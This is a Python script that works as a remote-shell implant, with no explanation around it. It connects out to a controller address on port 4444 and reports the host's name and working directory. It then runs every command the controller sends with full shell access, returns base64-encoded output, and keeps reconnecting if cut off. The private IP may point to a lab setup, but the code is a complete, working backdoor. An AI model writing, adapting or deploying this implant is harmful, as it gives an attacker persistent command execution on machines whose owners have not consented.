#!/usr/bin/env python3
import socket
import json
import base64
import subprocess
import shlex
import os
import time
import platform

SERVER_HOST = "192.168.56.1"   # <--- controller IP
SERVER_PORT = 4444
RECONNECT_DELAY = 5

def send_json(sock, obj):
    sock.sendall((json.dumps(obj) + "\n").encode())

def run_cmd(cmd, timeout=30):
    # Special cd handling is done before calling run_cmd
    try:
        completed = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)
        return completed.stdout
    except Exception as e:
        return str(e).encode()

def handle_server_message(msg):
    """
    msg example:
      { "type":"cmd", "cmd":"ls -la" }
    """
    mtype = msg.get("type")
    if mtype == "cmd":
        cmd = msg.get("cmd","")
        # return dict with output
        # we allow cd as a builtin:
        parts = []
        try:
            parts = shlex.split(cmd)
        except Exception:
            pass
        if parts and parts[0] == "cd":
            target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
            target = os.path.expanduser(target)
            try:
                os.chdir(target)
                reply = f"OK cwd: {os.getcwd()}\n".encode()
            except Exception as e:
                reply = f"cd failed: {e}\n".encode()
        else:
            reply = run_cmd(cmd)
        return reply
    return b""

def main_loop():
    while True:
        try:
            with socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=10) as s:
                # send registration
                hostname = platform.node()
                cwd = os.getcwd()
                send_json(s, {"type":"register", "hostname": hostname, "cwd": cwd})
                buffer = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    buffer += chunk
                    while b"\n" in buffer:
                        line, _, buffer = buffer.partition(b"\n")
                        try:
                            msg = json.loads(line.decode())
                        except Exception:
                            continue
                        # handle ping or cmd
                        if msg.get("type") == "cmd":
                            out = handle_server_message(msg)  # bytes
                            # send back base64-encoded output and cwd
                            send_json(s, {
                                "type": "output",
                                "hostname": hostname,
                                "cwd": os.getcwd(),
                                "output": base64.b64encode(out).decode()
                            })
                        else:
                            # ignore other types for now
                            pass
        except Exception as e:
            # reconnect with backoff
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main_loop()
